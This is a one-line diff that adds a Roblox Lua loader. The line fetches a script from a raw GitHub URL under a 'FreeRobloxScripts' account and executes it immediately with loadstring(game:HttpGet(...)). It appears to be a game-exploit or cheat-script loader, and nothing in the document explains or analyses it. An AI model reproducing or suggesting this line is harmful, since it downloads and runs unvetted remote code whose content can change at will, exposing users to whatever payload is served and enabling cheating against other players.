@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/FreeRobloxScripts/ScriptCreatorToTheRight/main/vinkhang100", true))()
